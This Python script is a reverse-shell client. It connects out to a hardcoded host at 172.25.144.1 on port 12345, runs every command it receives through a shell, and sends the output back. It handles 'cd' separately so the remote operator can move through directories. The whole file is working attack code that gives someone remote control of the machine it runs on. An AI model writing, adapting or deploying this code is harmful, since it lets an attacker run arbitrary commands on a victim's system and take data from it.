import socket
import subprocess
import os


client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

client_socket.connect(("172.25.144.1", 12345))

def chech_string(recv):
    return "cd" in recv

while True:
    try:
        message = (client_socket.recv(1024).decode("utf-8"))
        resp = chech_string(message)
        if not resp:
            result = subprocess.run(message, shell=True, capture_output=True, text=True)
            out = result.stdout
            err = result.stderr
            if not err:
                client_socket.sendall(out.encode("utf-8"))
            else:
                client_socket.sendall(err.encode("utf-8"))
        else:
            command = message.removeprefix("cd").strip()
            os.chdir(command)
            client_socket.sendall(os.getcwd().encode("utf-8"))
    except:
        client_socket.sendall("Error occoued. Send the command again".encode("utf-8"))
